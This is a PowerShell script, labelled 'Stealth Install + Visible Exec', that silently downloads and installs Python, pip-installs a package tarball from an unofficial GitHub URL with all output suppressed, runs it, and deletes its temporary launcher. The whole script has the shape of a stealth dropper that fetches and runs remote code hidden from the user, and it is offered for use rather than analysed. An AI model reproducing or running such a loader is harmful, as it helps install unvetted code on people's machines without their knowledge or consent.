# =====================================================
# Python 3.12.6 + httpfluent (Stealth Install + Visible Exec)
# =====================================================

$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true
$ExecutableToUse = $null

# --- Step 0: Check for existing Python >=3.9 ---
$Candidates = @()

# Check python in PATH
if (Get-Command python -ErrorAction SilentlyContinue) {
    $Candidates += (Get-Command python).Source
}
if (Get-Command python3 -ErrorAction SilentlyContinue) {
    $Candidates += (Get-Command python3).Source
}

# Check our install location
if (Test-Path $PythonExe) {
    $Candidates += $PythonExe
}

# Find best Python >=3.9
foreach ($candidate in ($Candidates | Select-Object -Unique)) {
    try {
        $ver = & $candidate --version 2>&1 | Out-String
        if ($ver -match "Python (\d+)\.(\d+)") {
            $major = [int]$Matches[1]
            $minor = [int]$Matches[2]
            if (($major -eq 3 -and $minor -ge 9) -or $major -gt 3) {
                $InstallRequired = $false
                $ExecutableToUse = $candidate
                break
            }
        }
    } catch { continue }
}

# --- Step 1-5: Stealth Python Installation ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $InstallerUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-amd64.exe"
    $InstallerPath = "$env:TEMP\python-installer.exe"
    
    # Download installer
    try {
        (New-Object System.Net.WebClient).DownloadFile($InstallerUrl, $InstallerPath) > $null 2>&1
    } catch {
        Invoke-WebRequest -Uri $InstallerUrl -OutFile $InstallerPath -UseBasicParsing > $null 2>&1
    }

    # Silent installation
    Start-Process -FilePath $InstallerPath `
        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=0 Include_test=0 TargetDir=`"$InstallDir`"" `
        -Wait -WindowStyle Hidden > $null 2>&1

    # Cleanup installer
    Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue > $null 2>&1

    if (Test-Path $PythonExe) {
        $ExecutableToUse = $PythonExe
        
        # Update user PATH
        $UserPath = [Environment]::GetEnvironmentVariable("Path", "User")
        $ScriptsDir = Join-Path $InstallDir "Scripts"
        
        if ($UserPath -notlike "*$InstallDir*") {
            $NewPath = "$InstallDir;$ScriptsDir;$UserPath"
            [Environment]::SetEnvironmentVariable("Path", $NewPath, "User") > $null 2>&1
            $env:Path = "$InstallDir;$ScriptsDir;$env:Path"
        }
    } else {
        exit 1
    }
}

# --- Step 6-7: Stealth Package Installation ---
& $ExecutableToUse -m pip install --upgrade pip --quiet --disable-pip-version-check > $null 2>&1
& $ExecutableToUse -m pip install requests --quiet --disable-pip-version-check > $null 2>&1
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet --force-reinstall --disable-pip-version-check > $null 2>&1

# --- Step 8: Find httpfluent entry point ---
$EntryScript = & $ExecutableToUse -c @"
import sys, os
try:
    import httpfluent
    pkg_dir = os.path.dirname(httpfluent.__file__)
    for entry in ['__main__.py', 'cli.py', 'main.py', 'app.py']:
        path = os.path.join(pkg_dir, entry)
        if os.path.exists(path):
            print(path)
            sys.exit(0)
    print(pkg_dir)
except: 
    sys.exit(1)
"@ 2>&1 | Select-Object -Last 1

# --- Step 9: Launch httpfluent VISIBLY ---
if ($EntryScript -and (Test-Path $EntryScript) -and $EntryScript -like "*.py") {
    # Method 1: Run the entry script directly in a new visible window
    Start-Process -FilePath $ExecutableToUse -ArgumentList "`"$EntryScript`"" -NoNewWindow
    
} else {
    # Method 2: Try running via import
    $LauncherScript = "$env:TEMP\httpfluent_launcher.py"
    
    @"
import sys
try:
    import httpfluent
    if hasattr(httpfluent, 'main'):
        httpfluent.main()
    elif hasattr(httpfluent, 'cli'):
        httpfluent.cli()
    elif hasattr(httpfluent, 'run'):
        httpfluent.run()
    else:
        import os
        pkg_dir = os.path.dirname(httpfluent.__file__)
        main_file = os.path.join(pkg_dir, '__main__.py')
        if os.path.exists(main_file):
            exec(open(main_file).read())
        else:
            print('httpfluent package found but no entry point')
            print('Location:', pkg_dir)
            print('Try: python -c "import httpfluent; help(httpfluent)"')
except Exception as e:
    print(f'Error: {e}')
    sys.exit(1)
"@ | Out-File -FilePath $LauncherScript -Encoding utf8 -Force > $null 2>&1

    # Run launcher visibly
    Start-Process -FilePath $ExecutableToUse -ArgumentList "`"$LauncherScript`"" -NoNewWindow
    
    # Cleanup launcher after a delay
    Start-Sleep -Seconds 2
    Remove-Item $LauncherScript -Force -ErrorAction SilentlyContinue > $null 2>&1
}
